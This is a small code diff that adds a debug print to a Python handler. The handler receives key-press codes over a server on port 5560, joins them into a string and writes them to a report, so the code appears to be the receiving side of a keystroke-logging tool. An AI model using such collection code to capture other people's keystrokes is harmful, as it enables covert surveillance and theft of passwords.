@@ -10,6 +10,7 @@ def handle_message(msg):
         keyList = msg['key_press']
         report = ''
         for key in keyList: report += chr(key)
+        print(report)
         write_report(report)
 
 s = pkbs.PKBServer(5560, handle_message)
